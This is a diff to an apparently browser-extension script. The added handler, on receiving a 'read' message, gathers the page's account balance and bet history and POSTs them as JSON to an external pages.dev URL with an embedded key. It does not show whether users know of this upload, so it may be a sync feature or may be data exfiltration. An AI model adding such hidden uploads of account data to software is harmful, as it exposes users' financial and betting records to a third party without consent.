@@ -131,9 +131,18 @@
     });
     return { balance: balance(), bets: keep };
   }
+  const BOARD = "https://the-arenasports.pages.dev/bets?k=arena-001bff8ddf784985";
+  let busy = false;
   chrome.runtime.onMessage.addListener(function (msg, _from, reply) {
     if (!msg || !msg.read) return;
-    readAll().then(reply);
-    return true;
+    reply({ started: true });          /* answered at once; the result follows */
+    if (busy) return;
+    busy = true;
+    readAll().then(function (got) {
+      if (typeof got.balance !== "number") return { done: "nobalance" };
+      return fetch(BOARD, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(got) })
+        .then(function (r) { return r.ok ? { done: "sent", n: got.bets.length } : { done: "error" }; });
+    }).catch(function () { return { done: "error" }; })
+      .then(function (res) { busy = false; chrome.runtime.sendMessage(res); });
   });
 })();
